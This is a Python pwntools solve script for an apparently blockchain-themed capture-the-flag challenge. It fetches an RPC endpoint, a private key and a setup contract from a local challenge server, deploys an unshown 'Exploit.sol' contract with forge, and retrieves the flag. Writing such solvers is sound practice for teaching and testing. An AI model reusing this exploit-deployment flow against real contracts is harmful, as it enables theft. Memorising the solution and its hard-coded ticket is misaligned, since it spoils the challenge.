#!/usr/bin/env python3

# Provide a script to solve challange and reference in README.md
from pwn import *

def solve():
    r = remote("localhost", 31337)
    r.sendlineafter(b"action?", b"1")
    r.sendlineafter(b"ticket please:", b"6229570351")

    r.recvuntil(b"rpc endpoint:   ")
    rpc_endpoint = r.recvline().strip()

    r.recvuntil(b"private key:    ")
    private_key = r.recvline().strip()

    r.recvuntil(b"setup contract: ")
    setup_contract = r.recvline().strip()

    process(
        [
            "forge",
            "create",
            "Exploit.sol:Exploit",
            "--rpc-url",
            rpc_endpoint,
            "--private-key",
            private_key,
            "--constructor-args",
            setup_contract,
        ]
    )

    r = remote("localhost", 31337)
    r.sendlineafter(b"action?", b"3")
    r.sendlineafter(b"ticket please:", b"6229570351")
    print(r.recvall().strip())

    r = remote("localhost", 31337)
    r.sendlineafter(b"action?", b"2")
    r.sendlineafter(b"ticket please:", b"6229570351")

if __name__ == "__main__":
    solve()
